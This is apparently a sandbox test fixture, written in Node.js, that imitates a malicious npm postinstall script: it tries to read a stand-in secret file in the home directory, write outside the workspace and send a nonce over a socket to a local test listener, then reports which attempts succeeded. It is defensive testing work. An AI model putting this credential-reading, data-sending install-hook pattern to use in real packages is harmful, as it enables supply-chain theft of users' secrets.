// HOSTILE FIXTURE (WP-G0C). Mimics an npm postinstall script. Never run it outside the sandbox runner
// except as the unsandboxed positive control in hostile.test.mjs.
// Attacks, each recorded separately so one failure does not hide the others:
//   secretRead      read $HOME/.vn-g0c-secret (stand-in for ~/.npmrc, ~/.ssh, cloud credentials)
//   outsideWrite    write $VN_G0C_OUTSIDE, a file outside the workspace
//   networkConnect  connect to 127.0.0.1:$VN_G0C_PORT (a listener the test opened) and send $VN_G0C_NONCE
// Legitimate work that the sandbox must keep working: workspaceRead and workspaceWrite.
import fs from 'node:fs';
import net from 'node:net';
import path from 'node:path';

const env = process.env;
const ws = env.VN_G0C_WORKSPACE;
const fail = (e) => ({ ok: false, code: e.code ?? null, errno: typeof e.errno === 'number' ? Math.abs(e.errno) : null, error: e.message });
const report = { fixture: 'npm-postinstall' };

try {
  report.secretRead = { ok: true, content: fs.readFileSync(path.join(env.HOME, '.vn-g0c-secret'), 'utf8') };
} catch (e) {
  report.secretRead = fail(e);
}

try {
  fs.writeFileSync(env.VN_G0C_OUTSIDE, `${env.VN_G0C_NONCE}\n`);
  report.outsideWrite = { ok: true };
} catch (e) {
  report.outsideWrite = fail(e);
}

report.networkConnect = await new Promise((resolve) => {
  const timer = setTimeout(() => resolve({ ok: false, error: 'timed out after 5000 ms' }), 5000);
  let sock;
  try {
    sock = net.connect({ host: '127.0.0.1', port: Number(env.VN_G0C_PORT) }, () => {
      clearTimeout(timer);
      sock.end(`${env.VN_G0C_NONCE}\n`);
      resolve({ ok: true });
    });
  } catch (e) {
    clearTimeout(timer);
    resolve(fail(e));
    return;
  }
  sock.on('error', (e) => {
    clearTimeout(timer);
    resolve(fail(e));
  });
});

try {
  report.workspaceRead = { ok: true, content: fs.readFileSync(path.join(ws, 'input.txt'), 'utf8') };
} catch (e) {
  report.workspaceRead = fail(e);
}

try {
  fs.mkdirSync(path.join(ws, 'out'), { recursive: true });
  fs.writeFileSync(path.join(ws, 'out', 'ok.txt'), 'workspace-write-ok\n');
  report.workspaceWrite = { ok: true };
} catch (e) {
  report.workspaceWrite = fail(e);
}

console.log(`VN_G0C_REPORT ${JSON.stringify(report)}`);
